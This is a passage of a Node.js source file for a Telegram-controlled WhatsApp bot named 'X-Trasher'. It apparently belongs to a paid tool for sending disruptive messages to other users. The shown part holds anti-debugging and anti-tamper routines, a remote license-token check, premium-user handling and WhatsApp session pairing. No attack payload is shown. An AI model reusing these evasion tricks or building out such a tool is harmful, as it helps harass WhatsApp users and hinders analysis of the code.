const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@bellaxchuu/xbailey');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/tokenkhusus69-pixel/evergarden/refs/heads/main/DataBase.json';
const thumbnailUrl = "https://files.catbox.moe/w9xxm8.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╰➤ INFORMATION:
 ▢ Developer: @ApongSkt
 ▢ Princess: Riskaa 🤍
 ▢ Version: Auto-Update Latest
 ▢ Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
TOKEN TIDAK TERDAFTAR ‼️‼️
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
TOKEN TIDAK TERDAFTAR ‼️‼️
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
TOKEN TIDAK TERDAFTAR ‼️‼️
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Gagal Menghubungi server token lu di tolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});



const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


╰➤ INFORMATION:
 ▢ Developer: @ApongSkt
 ▢ Princess: Riskaa 🤍
 ▢ Script: X-ᴛʀᴀꜱʜᴇʀ
 ▢ Version: Auto-Update Latest
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
